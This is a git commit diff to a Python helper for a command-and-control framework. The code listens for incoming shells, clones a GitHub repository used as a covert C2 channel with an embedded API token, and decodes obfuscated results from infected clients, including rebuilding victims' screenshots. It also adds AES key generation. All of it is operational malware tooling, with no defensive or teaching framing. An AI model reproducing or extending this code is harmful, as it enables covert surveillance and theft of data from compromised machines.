8951718e5c992312a2a1109acca2155d50f86428
Monish Kumar <ap.monishkumar@protonmail.com>
2024-09-28 11:02:41 +0530

    [feat]: function to pull and process c2 data

--- c2Helper.py
+++ c2Helper.py
@@ -2,9 +2,9 @@ import argparse
 from config import PARAM
 from json import loads
 from key import GIT_API_KEY
+from modules.cryptos import AESModule
 from modules.sneaks import obfuscation
 import os
-import pathlib
 from select import select
 from shutil import rmtree
 import socket
@@ -36,7 +36,7 @@ class ShellHelper:
         self.__serverSoc.bind((self.__bindAddress, self.__port))
 
     def startShell(self) -> None:
-        self.__serverSoc.listen(1)
+        self.__serverSoc.listen(5)
         print(
             "*** Server started and listening on {}:{} ***".format(
                 self.__bindAddress, self.__port
@@ -87,22 +87,58 @@ class ShellHelper:
         return result.strip("\n")
 
 
+class CustomProcessors:
+    @staticmethod
+    def processImage(filePath: str,client: str, sneak: str) -> None:
+        with open(filePath) as f:
+            con = f.read()
+        con = obfuscation.DSNEAKS[sneak](con)
+        imgData = bytes(bytearray.fromhex(con))
+        print("[ii]: Screenshot written to {}/screenshots/{}.jpg".format(client,filePath.split("/")[-1]))
+        with open(
+            "results/{}/screenshots/{}.jpg".format(client,filePath.split("/")[-1]), "wb"
+        ) as f:
+            f.write(imgData)
+
+
 def processFromGithubC2(repo: str, sneak: str) -> None:
     if sneak == None:
         sneak = "nothing"
     result: dict[str, str] = {}
-    os.mkdir("results")
+    try:
+        os.mkdir("results")
+    except FileExistsError:
+        pass
     os.system("git clone https://{}@github.com/{} c2stuff".format(GIT_API_KEY, repo))
     for client in os.listdir("c2stuff"):
         result = {}
-        if client != "modules":
+        if client != "modules" and client != ".git":
+            try:
+                os.mkdir("results/{}".format(client))
+                os.mkdir("results/{}/screenshots".format(client))
+            except FileExistsError:
+                pass
             print("[ii]: Processing {}".format(client))
             dirCons = sorted(os.listdir("c2stuff/{}".format(client)))
             for file in dirCons:
                 if file == "00_commands":
                     pass
                 elif file == "00_results":
-                    pass  # TODO: Add processors to commands result folder
+                    for res in os.listdir("c2stuff/{}/00_results".format(client)):
+                        if res.startswith("screenshot"):
+                            CustomProcessors.processImage(
+                                "c2stuff/{}/00_results/{}".format(client,res), client, sneak
+                            )
+                        else:
+                            context = res.split("_")[-2]
+                            with open("c2stuff/{}/00_results/{}".format(client,res)) as f:
+                                cons = f.read()
+                            if result.get(context) == None:
+                                result[context] = obfuscation.DSNEAKS[sneak](cons)
+                            else:
+                                result[context] += "\n" + obfuscation.DSNEAKS[sneak](
+                                    cons
+                                )
                 elif file == "00_info":
                     with open("c2stuff/{}/00_info".format(client)) as f:
                         info = f.read()
@@ -119,11 +155,10 @@ def processFromGithubC2(repo: str, sneak: str) -> None:
                                 result[key] += val
                             else:
                                 result[key] = val
-        os.mkdir("c2stuff/results/{}".format(client))
-        for key, val in result.items():
-            print("Writing {}.txt to results")
-            with open("c2stuff/results/{}/{}.txt".format(client, key), "w") as f:
-                f.write(val)
+            for key, val in result.items():
+                print("[ii]: Writing {}/{}.txt to results".format(client, key))
+                with open("results/{}/{}.txt".format(client, key), "w") as f:
+                    f.write(val)
 
 
 if __name__ == "__main__":
@@ -157,6 +192,12 @@ if __name__ == "__main__":
     parser.add_argument(
         "-6", "--ipv6", action="store_true", help="Forces listener to use IPv6"
     )
+    parser.add_argument(
+        "-g", "--generatekey", action="store_true", help="For generating keys prior"
+    )
+    parser.add_argument(
+        "-ks", "--keysize", type=int, default=128, help="Key size for generation. Default 128 bits"
+    )
     parser.add_argument("-a", "--addr", type=str, help="Address to bind the listener")
     args = parser.parse_args()
     if args.listen:
@@ -169,6 +210,10 @@ if __name__ == "__main__":
         except Exception as e:
             print(e.args[1])
             exit(1)
+    elif args.generatekey:
+        print("*** Key generated for {} bits ***".format(args.keysize))
+        aes = AESModule(args.keysize)
+        print("{}".format(aes.key.hex()))
     else:
         if args.repo == None:
             print("[EE]: A github repository is required to refresh")
@@ -176,7 +221,8 @@ if __name__ == "__main__":
             exit(1)
         try:
             rmtree("c2stuff")
+            rmtree("results")
         except FileNotFoundError:
             pass
         os.mkdir("c2stuff")
-        processFromGithubC2(args.repo, args.sneak)
+        processFromGithubC2(args.repo, args.obfuscation)
